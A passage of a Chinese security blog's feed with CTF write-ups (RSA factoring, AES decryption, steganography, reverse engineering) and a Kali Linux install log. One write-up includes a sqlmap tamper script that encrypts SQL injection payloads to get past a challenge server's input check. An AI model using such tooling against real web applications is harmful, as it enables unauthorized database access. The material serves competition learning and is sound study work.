  <entry>
    <title>i春秋 第二届春秋欢乐赛 CryMisc Writeup</title>
    <url>/2018/12/21/isa-ctf-4/</url>
    <content><![CDATA[<h2 id="解压"><a href="#解压" class="headerlink" title="解压"></a>解压</h2><p>把压缩文件解压，得到<code>crypto.zip</code>和<code>jiami.py</code>，而前者中包含有<code>jiami.py</code>，构造一个zip出来查看CRC，发现是同一文件，所以进行明文攻击。</p>
<p>然后将其中的<code>gogogo.zip</code>解压，得到三个文件<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/crymisc_1.png"></p>
<span id="more"></span>
<h2 id="查看代码"><a href="#查看代码" class="headerlink" title="查看代码"></a>查看代码</h2><p>打开<code>AESencrypt.py</code>，查看代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">s=<span class="built_in">open</span>(<span class="string">&#x27;next.zip&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">BS=<span class="number">16</span></span><br><span class="line">pad_len=BS-<span class="built_in">len</span>(s)%BS</span><br><span class="line">padding=<span class="built_in">chr</span>(pad_len)*pad_len</span><br><span class="line">s+=padding</span><br><span class="line"></span><br><span class="line">key=<span class="string">&#x27;我后来忘了&#x27;</span></span><br><span class="line">n=<span class="number">0x48D6B5DAB6617F21B39AB2F7B14969A7337247CABB417B900AE1D986DB47D971</span></span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line">m=long(key.encode(<span class="string">&#x27;hex&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line">c=<span class="string">&#x27;0&#123;:x&#125;&#x27;</span>.<span class="built_in">format</span>(c).decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;RSA.encrypt&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(c)</span><br><span class="line"></span><br><span class="line">obj=AES.new(key,AES.MODE_ECB)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;AES.encryt&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(obj.encrypt(s))</span><br></pre></td></tr></table></figure>
<p>由<code>c=&#39;0&#123;:x&#125;&#39;.format(c).decode(&#39;hex&#39;)</code>发现是python2的代码（似乎还多写了个0….）<br>发现key被RSA加密了，给出了n和e，将n分解（当p、q的取值差异过大或过于相近的时候，使用yafu可以快速的把n值分解出p、q值）<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/crymisc_2.png"><br>解出两个质数是<code>177334994338425644535647498913444186659</code>和<code>185783328357334813222812664416930395483</code><br>使用<code>gmpy2</code>解出<code>d = 21459038613121460434132216103140795081593356519819592462521069311922260546829</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">d = gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="comment">#21459038613121460434132216103140795081593356519819592462521069311922260546829</span></span><br></pre></td></tr></table></figure>
<p>(其实用<code>RSA-Tool2</code>也行，这样就没必要装<code>gmpy2</code>了)<br>以16进制读取<code>RSA.encrypt</code>文件，得到<code>68c2e12fadebbd344e82fa9e1eac0f0bde5aecbd7840f18352cf761f872233d</code><br>再转化为数字</p>
<h3 id="转化代码"><a href="#转化代码" class="headerlink" title="转化代码"></a>转化代码</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#python3</span></span><br><span class="line">byte = <span class="built_in">open</span>(<span class="string">&quot;RSA.encrypt&quot;</span> , <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">hexstr = binascii.b2a_hex(byte).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">c = <span class="built_in">int</span>(hexstr,<span class="number">16</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#python2.7</span></span><br><span class="line">c = <span class="built_in">int</span>(<span class="built_in">open</span>(<span class="string">&quot;RSA.encrypt&quot;</span> , <span class="string">&quot;rb&quot;</span>).read().encode(<span class="string">&#x27;hex&#x27;</span>),<span class="number">16</span>)</span><br></pre></td></tr></table></figure>
<p>使用<code>RSA-Tool2</code>（需要把字母转为大写，神奇的bug….）或使用python代码解密</p>
<h2 id="解密key"><a href="#解密key" class="headerlink" title="解密key"></a>解密key</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#python3</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">HextoAscii</span>(<span class="params">hexnum</span>):</span></span><br><span class="line">    hexStr = <span class="built_in">str</span>(hexnum).replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> binascii.a2b_hex(hexStr).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line">c = <span class="number">0x068C2E12FADEBBD344E82FA9E1EAC0F0BDE5AECBD7840F18352CF761F872233D</span></span><br><span class="line">n = <span class="number">0x48D6B5DAB6617F21B39AB2F7B14969A7337247CABB417B900AE1D986DB47D971</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">p = <span class="number">185783328357334813222812664416930395483</span></span><br><span class="line">q = <span class="number">177334994338425644535647498913444186659</span></span><br><span class="line">d = <span class="number">21459038613121460434132216103140795081593356519819592462521069311922260546829</span></span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line">hexnum = <span class="built_in">hex</span>(m)</span><br><span class="line"><span class="built_in">print</span>(HextoAscii(hexnum))</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#python2.7</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">c = <span class="number">0x068c2e12fadebbd344e82fa9e1eac0f0bde5aecbd7840f18352cf761f872233d</span><span class="comment">#read RSA.encrypt</span></span><br><span class="line">n = <span class="number">0x48D6B5DAB6617F21B39AB2F7B14969A7337247CABB417B900AE1D986DB47D971</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">p = <span class="number">185783328357334813222812664416930395483</span></span><br><span class="line">q = <span class="number">177334994338425644535647498913444186659</span></span><br><span class="line">d = <span class="number">21459038613121460434132216103140795081593356519819592462521069311922260546829</span></span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line">key = <span class="string">&quot;&#123;:x&#125;&quot;</span>.<span class="built_in">format</span>(m).decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(key)</span><br></pre></td></tr></table></figure>
<p><code>m=132172197780003798270878941356862694777</code><br>16进制就是<code>636F70795F5F77686974655F5F6B6579</code><br>HexDecode得到<code>copy__white__key</code></p>
<h2 id="解密AES-crypt文件"><a href="#解密AES-crypt文件" class="headerlink" title="解密AES.crypt文件"></a>解密AES.crypt文件</h2><p>修改一下<code>AESencrypt.py</code>，然后运行，得到<code>next.zip</code><br>代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">s=<span class="built_in">open</span>(<span class="string">&#x27;AES.encryt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">BS=<span class="number">16</span></span><br><span class="line">pad_len=BS-<span class="built_in">len</span>(s)%BS</span><br><span class="line">padding=<span class="built_in">chr</span>(pad_len)*pad_len</span><br><span class="line">s+=padding</span><br><span class="line"></span><br><span class="line">key=<span class="string">&#x27;copy__white__key&#x27;</span></span><br><span class="line"></span><br><span class="line">obj=AES.new(key,AES.MODE_ECB)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;next.zip&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(obj.decrypt(s))</span><br></pre></td></tr></table></figure>
<p>解压缩<code>next.zip</code>得到三个文件<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/crymisc_3.png"><br>查看<code>encrypt.py</code>，代码如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s=<span class="built_in">open</span>(<span class="string">&#x27;flag.jpg&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">s=<span class="string">&#x27;-&#x27;</span>.join(<span class="built_in">map</span>(b16encode,<span class="built_in">list</span>(s)))</span><br><span class="line">s=<span class="built_in">map</span>(<span class="string">&#x27;&#x27;</span>.join,<span class="built_in">zip</span>(*(s.split(<span class="string">&#x27;-&#x27;</span>))))</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;first&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(b16decode(s[<span class="number">0</span>]))</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;second&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(b16decode(s[<span class="number">1</span>]))</span><br></pre></td></tr></table></figure>
<p>发现是把flag.jpg拆成两部分，都使用base16 decode了一次</p>
<h2 id="合并出flag-jpg"><a href="#合并出flag-jpg" class="headerlink" title="合并出flag.jpg"></a>合并出flag.jpg</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line">s = [<span class="number">0</span>,<span class="number">1</span>]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;first&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    s[<span class="number">0</span>] = b16encode(f.read())</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;second&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    s[<span class="number">1</span>] = b16encode(f.read())</span><br><span class="line">s=<span class="built_in">map</span>(<span class="string">&#x27;&#x27;</span>.join,<span class="built_in">zip</span>(*s))</span><br><span class="line">s=b16decode(<span class="string">&#x27;&#x27;</span>.join(s))</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.jpg&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">	f.write(s)</span><br></pre></td></tr></table></figure>
<p><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/CryMisc_flag.jpg"><br>(可自行保存分析)<br>按照惯例，肯定是藏在文件尾，010Editor打开，提取出尾部文件<br>发现是psd文件<br>![](<a href="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/CryMisc_PS.png">https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/CryMisc_PS.png</a> =439x)<br>key为<code>copy__white__key</code>，这是一个提示，把背景导出为png</p>
<h2 id="查看bg-png"><a href="#查看bg-png" class="headerlink" title="查看bg.png"></a>查看bg.png</h2><p>使用stegsolve打开，点一下左箭头，得到一个二维码，解码得到flag</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/zyxyzz/article/details/72629354">CryMisc__writeup</a><br><a href="https://err0rzz.github.io/2017/11/14/CTF%E4%B8%ADRSA%E5%A5%97%E8%B7%AF/">CTF中RSA套路</a><br><a href="https://www.freebuf.com/sectool/163781.html">RSA史上最强剖析，从小白变大神，附常用工具使用方法及CTF中RSA典型例题</a></p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali 2021.2 安装记录 (Win10双系统)</title>
    <url>/2021/09/06/kali-install-with-win10/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>为尝鲜<code>Windows 11</code>，把之前的<code>Ubuntu</code>删了。结果<code>Windows 11</code>用起来并不顺手。为了方便调试和开发（自带root终端），决定安装<code>Kali 2021.2</code>。</p>
<p>前文见<a href="https://blog.xhyeax.com/2019/02/16/ubuntu-install/">Ubuntu18.04安装记录(与Win10双系统共存)</a></p>
<span id="more"></span>
<h2 id="使用Ventoy制作启动U盘"><a href="#使用Ventoy制作启动U盘" class="headerlink" title="使用Ventoy制作启动U盘"></a>使用Ventoy制作启动U盘</h2><p>步骤见官网：<a href="https://www.ventoy.net/cn/index.html">Ventoy</a><br>记得备份U盘数据</p>
<h2 id="下载系统镜像"><a href="#下载系统镜像" class="headerlink" title="下载系统镜像"></a>下载系统镜像</h2><p>推荐在镜像站下载，如<a href="https://mirrors.tuna.tsinghua.edu.cn/">清华大学开源软件镜像站</a></p>
<p>下载完成后，直接拷贝到U盘即可</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>进入<code>BIOS</code>，关闭安全启动(<code>secure boot</code>)，并修改启动顺序，优先从U盘启动</p>
<p>选择图形化安装（第一个），语言选中文，按步骤安装即可（分区见下文）</p>
<p>PS：建议连接网络安装，可自动同步时间</p>
<h2 id="分区"><a href="#分区" class="headerlink" title="分区"></a>分区</h2><p>主要有以下三个分区：</p>
<p><code>efi</code> (固态)： 有的话可以不做修改，直接使用固态盘的EFI分区即可。没有则创建256M的EFI分区<br><code>swap</code> (固态)： 交换空间，一般设置为内存的1到2倍，个人是设置的8G<br><code>/</code>： 剩下的空间可直接分配给该分区</p>
<p><code>/home</code>、<code>/var</code>和<code>/usr</code>等路径如果不配置的话，就是跟<code>/</code>在同一个分区</p>
<p>PS： 个人觉得不配置反而方便一点，不用考虑每个分区的容量</p>
<h2 id="系统软件"><a href="#系统软件" class="headerlink" title="系统软件"></a>系统软件</h2><p>按照默认配置安装桌面环境和工具，之后等待系统安装完成即可</p>
<h2 id="启动系统"><a href="#启动系统" class="headerlink" title="启动系统"></a>启动系统</h2><p>系统安装完成后会提示拔出安装介质，此时拔出U盘，重启后，选择第一个选项进入<code>Kali</code>系统</p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="更改SSH秘钥和root密码"><a href="#更改SSH秘钥和root密码" class="headerlink" title="更改SSH秘钥和root密码"></a>更改SSH秘钥和root密码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /etc/ssh/</span><br><span class="line">sudo dpkg-reconfigure openssh-server</span><br></pre></td></tr></table></figure>
<p>（默认密码为toor）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo passwd root</span><br></pre></td></tr></table></figure>
<h3 id="查看shell"><a href="#查看shell" class="headerlink" title="查看shell"></a>查看shell</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">env | grep SHELL</span><br></pre></td></tr></table></figure>
<p>默认为<code>zsh</code></p>
<h3 id="配置环境变量"><a href="#配置环境变量" class="headerlink" title="配置环境变量"></a>配置环境变量</h3><p>可在<code>.zshrc</code>末尾增加环境变量</p>
<h3 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h3><p><a href="https://zhuanlan.zhihu.com/p/82361096">kali安装docker环境</a><br>建议配置镜像下载加速，见<a href="https://blog.xhyeax.com/2020/04/16/aosp-docker/">使用docker编译安卓源码 </a></p>
<h3 id="搜狗输入法"><a href="#搜狗输入法" class="headerlink" title="搜狗输入法"></a>搜狗输入法</h3><p><a href="https://pinyin.sogou.com/linux/help.php">搜狗输入法 安装指南</a><br>安装完成后，需要重启系统</p>
<p><code>设置</code>-<code>Fcitx配置</code>，增加一个<code>键盘 - 英语</code>输入法。（方便<code>Ctrl+Shift</code>切换输入法）</p>
<p>可在<code>全局配置</code>中设置快捷键和外观（需要<code>显示高级选项</code>，可关闭<code>切换输入法时显示输入法提示</code>）</p>
<h3 id="VS-Code"><a href="#VS-Code" class="headerlink" title="VS Code"></a>VS Code</h3><h4 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h4><p><a href="https://code.visualstudio.com/">VS Code官网</a>下载<code>.deb</code>，<code>sudo dpkg -i code_xxxx.deb</code>安装即可</p>
<h4 id="更换终端字体"><a href="#更换终端字体" class="headerlink" title="更换终端字体"></a>更换终端字体</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /usr/share/fonts/truetype/</span><br><span class="line">sudo git clone https://github.com/abertsch/Menlo-for-Powerline.git</span><br><span class="line">sudo fc-cache -f -v</span><br></pre></td></tr></table></figure>
<p>在<code>setting.json</code>中增加以下内容，或直接在设置中搜索<code>terminal.integrated.fontFamily</code></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;terminal.integrated.fontFamily&quot;</span>: <span class="string">&quot;Menlo for Powerline&quot;</span>,</span><br></pre></td></tr></table></figure>
<h3 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h3><p>自行百度</p>
<h3 id="更多"><a href="#更多" class="headerlink" title="更多"></a>更多</h3><p>其他软件的安装方式请自行搜索。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://howiezhao.github.io/2019/02/25/after-kali/">安装 Kali Linux 后要做的 10 件事 </a><br><a href="https://blog.csdn.net/study_in/article/details/104389345">Linux下配置vscode(终端字体篇)</a></p>
]]></content>
  </entry>
  <entry>
    <title>isa_ctf2</title>
    <url>/2018/11/29/isa-ctf2/</url>
    <content><![CDATA[<h2 id="Web-Code-Check（湖湘杯）"><a href="#Web-Code-Check（湖湘杯）" class="headerlink" title="Web - Code Check（湖湘杯）"></a>Web - Code Check（湖湘杯）</h2><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>从get请求id参数中解密出正确id，然后执行sql查询语句,将查询结果返回到数组<br>decode函数：<br>将传入的data（也就是get方法的id参数）解2次base64后<br>使用aes-128位 CBC模式 填充为ZeroPadding 解密，key为<code>ydhaqPQnexoaDuW3</code> iv为<code>2018201920202021</code><br>检测解密后的数据后7位是否为hxb2018<br>如果不是则输出<code>&lt;script&gt;window.location.href=&quot;/index.php&quot;;&lt;/script&gt;</code><br>也就是js跳转到<code>/index.php</code><br>否则，返回去除首尾空格以及末尾hxb2018后的明文数据</p>
<span id="more"></span>
<h3 id="temper"><a href="#temper" class="headerlink" title="temper"></a>temper</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"> </span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span>():</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AESCipher</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, key,iv</span>):</span></span><br><span class="line">        self.key = key[<span class="number">0</span>:<span class="number">16</span>] </span><br><span class="line">        self.iv = iv[<span class="number">0</span>:<span class="number">16</span>] </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__pad</span>(<span class="params">self, text</span>):</span></span><br><span class="line">        <span class="string">&quot;PHP只有ZeroPadding&quot;</span></span><br><span class="line">        text_length = <span class="built_in">len</span>(text)</span><br><span class="line">        amount_to_pad = AES.block_size - (text_length % AES.block_size)</span><br><span class="line">        <span class="keyword">if</span> amount_to_pad == <span class="number">0</span>:</span><br><span class="line">            amount_to_pad = AES.block_size</span><br><span class="line">        pad = <span class="string">&#x27;\0&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> text + pad * amount_to_pad</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">self, raw</span>):</span></span><br><span class="line">        raw = self.__pad(raw)</span><br><span class="line">        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)</span><br><span class="line">        <span class="keyword">return</span> base64.b64encode(base64.b64encode(cipher.encrypt(raw)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">text</span>):</span></span><br><span class="line">    Enc = AESCipher(<span class="string">&quot;ydhaqPQnexoaDuW3&quot;</span>,<span class="string">&quot;2018201920202021&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> Enc.encrypt(text+<span class="string">&quot;hxb2018&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line">    <span class="keyword">return</span> encrypt(payload)</span><br></pre></td></tr></table></figure>
<h2 id="Misc-Disk（湖湘杯）"><a href="#Misc-Disk（湖湘杯）" class="headerlink" title="Misc - Disk（湖湘杯）"></a>Misc - Disk（湖湘杯）</h2><blockquote>
<p>ftk打开发现有4个flag文件，保存下来是二进制，转十进制然后转ascii<br><a href="https://www.jianshu.com/p/62c629c076ad">https://www.jianshu.com/p/62c629c076ad</a></p>
</blockquote>
<p>其实直接010打开搜索flag就可以发现有ads隐写了，不过用工具更方便</p>
<h2 id="Reverse-Replace（湖湘杯）"><a href="#Reverse-Replace（湖湘杯）" class="headerlink" title="Reverse - Replace（湖湘杯）"></a>Reverse - Replace（湖湘杯）</h2><p>upx脱壳，我是直接copy算法出来爆破解决的</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> byte_402150[] = &#123; <span class="number">0x32</span>,<span class="number">0x61</span>,<span class="number">0x34</span>,<span class="number">0x39</span>,<span class="number">0x66</span>,<span class="number">0x36</span>,<span class="number">0x39</span>,<span class="number">0x63</span>,<span class="number">0x33</span>,<span class="number">0x38</span>,<span class="number">0x33</span>,<span class="number">0x39</span>,<span class="number">0x35</span>,<span class="number">0x63</span>,<span class="number">0x64</span>,<span class="number">0x65</span>,<span class="number">0x39</span>,<span class="number">0x36</span>,<span class="number">0x64</span>,<span class="number">0x36</span>,<span class="number">0x64</span>,<span class="number">0x65</span>,<span class="number">0x39</span>,<span class="number">0x36</span>,<span class="number">0x64</span>,<span class="number">0x36</span>,<span class="number">0x66</span>,<span class="number">0x34</span>,<span class="number">0x65</span>,<span class="number">0x30</span>,<span class="number">0x32</span>,<span class="number">0x35</span>,<span class="number">0x34</span>,<span class="number">0x38</span>,<span class="number">0x34</span>,<span class="number">0x39</span>,<span class="number">0x35</span>,<span class="number">0x34</span>,<span class="number">0x64</span>,<span class="number">0x36</span>,<span class="number">0x31</span>,<span class="number">0x39</span>,<span class="number">0x35</span>,<span class="number">0x34</span>,<span class="number">0x34</span>,<span class="number">0x38</span>,<span class="number">0x64</span>,<span class="number">0x65</span>,<span class="number">0x66</span>,<span class="number">0x36</span>,<span class="number">0x65</span>,<span class="number">0x32</span>,<span class="number">0x64</span>,<span class="number">0x61</span>,<span class="number">0x64</span>,<span class="number">0x36</span>,<span class="number">0x37</span>,<span class="number">0x37</span>,<span class="number">0x38</span>,<span class="number">0x36</span>,<span class="number">0x65</span>,<span class="number">0x32</span>,<span class="number">0x31</span>,<span class="number">0x64</span>,<span class="number">0x35</span>,<span class="number">0x61</span>,<span class="number">0x64</span>,<span class="number">0x61</span>,<span class="number">0x65</span>,<span class="number">0x36</span> &#125;;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> byte_4021A0[] = &#123; <span class="number">0x63</span>,<span class="number">0x7C</span>,<span class="number">0x77</span>,<span class="number">0x7B</span>,<span class="number">0xF2</span>,<span class="number">0x6B</span>,<span class="number">0x6F</span>,<span class="number">0xC5</span>,<span class="number">0x30</span>,<span class="number">0x01</span>,<span class="number">0x67</span>,<span class="number">0x2B</span>,<span class="number">0xFE</span>,<span class="number">0xD7</span>,<span class="number">0xAB</span>,<span class="number">0x76</span>,<span class="number">0xCA</span>,<span class="number">0x82</span>,<span class="number">0xC9</span>,<span class="number">0x7D</span>,<span class="number">0xFA</span>,<span class="number">0x59</span>,<span class="number">0x47</span>,<span class="number">0xF0</span>,<span class="number">0xAD</span>,<span class="number">0xD4</span>,<span class="number">0xA2</span>,<span class="number">0xAF</span>,<span class="number">0x9C</span>,<span class="number">0xA4</span>,<span class="number">0x72</span>,<span class="number">0xC0</span>,<span class="number">0xB7</span>,<span class="number">0xFD</span>,<span class="number">0x93</span>,<span class="number">0x26</span>,<span class="number">0x36</span>,<span class="number">0x3F</span>,<span class="number">0xF7</span>,<span class="number">0xCC</span>,<span class="number">0x34</span>,<span class="number">0xA5</span>,<span class="number">0xE5</span>,<span class="number">0xF1</span>,<span class="number">0x71</span>,<span class="number">0xD8</span>,<span class="number">0x31</span>,<span class="number">0x15</span>,<span class="number">0x04</span>,<span class="number">0xC7</span>,<span class="number">0x23</span>,<span class="number">0xC3</span>,<span class="number">0x18</span>,<span class="number">0x96</span>,<span class="number">0x05</span>,<span class="number">0x9A</span>,<span class="number">0x07</span>,<span class="number">0x12</span>,<span class="number">0x80</span>,<span class="number">0xE2</span>,<span class="number">0xEB</span>,<span class="number">0x27</span>,<span class="number">0xB2</span>,<span class="number">0x75</span>,<span class="number">0x09</span>,<span class="number">0x83</span>,<span class="number">0x2C</span>,<span class="number">0x1A</span>,<span class="number">0x1B</span>,<span class="number">0x6E</span>,<span class="number">0x5A</span>,<span class="number">0xA0</span>,<span class="number">0x52</span>,<span class="number">0x3B</span>,<span class="number">0xD6</span>,<span class="number">0xB3</span>,<span class="number">0x29</span>,<span class="number">0xE3</span>,<span class="number">0x2F</span>,<span class="number">0x84</span>,<span class="number">0x53</span>,<span class="number">0xD1</span>,<span class="number">0x00</span>,<span class="number">0xED</span>,<span class="number">0x20</span>,<span class="number">0xFC</span>,<span class="number">0xB1</span>,<span class="number">0x5B</span>,<span class="number">0x6A</span>,<span class="number">0xCB</span>,<span class="number">0xBE</span>,<span class="number">0x39</span>,<span class="number">0x4A</span>,<span class="number">0x4C</span>,<span class="number">0x58</span>,<span class="number">0xCF</span>,<span class="number">0xD0</span>,<span class="number">0xEF</span>,<span class="number">0xAA</span>,<span class="number">0xFB</span>,<span class="number">0x43</span>,<span class="number">0x4D</span>,<span class="number">0x33</span>,<span class="number">0x85</span>,<span class="number">0x45</span>,<span class="number">0xF9</span>,<span class="number">0x02</span>,<span class="number">0x7F</span>,<span class="number">0x50</span>,<span class="number">0x3C</span>,<span class="number">0x9F</span>,<span class="number">0xA8</span>,<span class="number">0x51</span>,<span class="number">0xA3</span>,<span class="number">0x40</span>,<span class="number">0x8F</span>,<span class="number">0x92</span>,<span class="number">0x9D</span>,<span class="number">0x38</span>,<span class="number">0xF5</span>,<span class="number">0xBC</span>,<span class="number">0xB6</span>,<span class="number">0xDA</span>,<span class="number">0x21</span>,<span class="number">0x10</span>,<span class="number">0xFF</span>,<span class="number">0xF3</span>,<span class="number">0xD2</span>,<span class="number">0xCD</span>,<span class="number">0x0C</span>,<span class="number">0x13</span>,<span class="number">0xEC</span>,<span class="number">0x5F</span>,<span class="number">0x97</span>,<span class="number">0x44</span>,<span class="number">0x17</span>,<span class="number">0xC4</span>,<span class="number">0xA7</span>,<span class="number">0x7E</span>,<span class="number">0x3D</span>,<span class="number">0x64</span>,<span class="number">0x5D</span>,<span class="number">0x19</span>,<span class="number">0x73</span>,<span class="number">0x60</span>,<span class="number">0x81</span>,<span class="number">0x4F</span>,<span class="number">0xDC</span>,<span class="number">0x22</span>,<span class="number">0x2A</span>,<span class="number">0x90</span>,<span class="number">0x88</span>,<span class="number">0x46</span>,<span class="number">0xEE</span>,<span class="number">0xB8</span>,<span class="number">0x14</span>,<span class="number">0xDE</span>,<span class="number">0x5E</span>,<span class="number">0x0B</span>,<span class="number">0xDB</span>,<span class="number">0xE0</span>,<span class="number">0x32</span>,<span class="number">0x3A</span>,<span class="number">0x0A</span>,<span class="number">0x49</span>,<span class="number">0x06</span>,<span class="number">0x24</span>,<span class="number">0x5C</span>,<span class="number">0xC2</span>,<span class="number">0xD3</span>,<span class="number">0xAC</span>,<span class="number">0x62</span>,<span class="number">0x91</span>,<span class="number">0x95</span>,<span class="number">0xE4</span>,<span class="number">0x79</span>,<span class="number">0xE7</span>,<span class="number">0xC8</span>,<span class="number">0x37</span>,<span class="number">0x6D</span>,<span 